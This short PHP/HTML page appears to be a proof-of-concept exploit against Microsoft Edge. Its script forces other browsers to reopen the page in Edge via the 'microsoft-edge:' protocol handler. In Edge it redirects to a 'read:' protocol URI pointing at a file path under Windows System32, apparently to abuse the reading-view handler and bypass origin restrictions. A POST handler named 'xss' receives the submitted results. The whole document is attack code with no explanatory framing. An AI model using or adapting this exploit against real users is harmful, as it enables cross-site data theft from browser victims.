<!doctype html>
<html><head><meta charset="UTF-8"></head>
<body>
<?php
	if (isset($_POST['xss'])) {

		echo "Thank you for submitting the following file:<br><br>";
		echo htmlspecialchars($_POST['xss']);
		exit();
	}
	else {
?>
	<script>
		if (!/Edge\/\d./i.test(navigator.userAgent)) {
			document.body.innerHTML = "Sorry this page can only be viewed with Microsoft Edge";
			window.location = "microsoft-edge:<?php echo (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>";
		}
		else {
			window.location = "read:,c:\\windows\\System32\\drivers\\etc\\exploit.html," + Math.floor(Math.random() * 1000);
		}
	</script>
<?php } ?>
</body>
</html>